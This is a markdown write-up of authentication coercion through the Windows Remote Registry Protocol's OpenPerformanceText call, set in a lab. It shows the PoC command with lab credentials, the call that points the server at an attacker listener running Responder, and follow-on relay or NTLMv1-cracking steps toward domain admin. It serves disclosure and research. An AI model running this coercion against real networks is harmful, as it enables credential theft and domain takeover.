# MS-RRP - Remote call to OpenPerformanceText (opnum 32)

## Summary

+ **Protocol**: [[MS-RRP]: Windows Remote Registry Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78)

+ **Protocol UUID**: 338cd001-2244-31f1-aaaa-900038001003

+ **Protocol version**: 1.0

+ **SMB Named pipe**: `\PIPE\winreg`

+ **Function name**: [`OpenPerformanceText`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/44954f6d-ef2c-4ec1-a27d-32b9b87e3c8a)

+ **Function operation number**: `32`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\winreg` and bind to the desired [`MS-RRP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78) protocol (with uuid `338cd001-2244-31f1-aaaa-900038001003` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-RRP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\winreg` This pipe is connected to the protocol [[MS-RRP]: Windows Remote Registry Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78) and allows to call RPC functions of this protocol. We will then call the remote [`OpenPerformanceText`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/44954f6d-ef2c-4ec1-a27d-32b9b87e3c8a) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
OpenPerformanceText('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
error_status_t OpenPerformanceText(
   [in, unique] PREGISTRY_SERVER_NAME ServerName,
   [in] REGSAM samDesired,
   [out] PRPC_HKEY phKey
 );
```

## References

+ Documentation of protocol [MS-RRP]: Windows Remote Registry Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78

+ Documentation of function `OpenPerformanceText`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/44954f6d-ef2c-4ec1-a27d-32b9b87e3c8a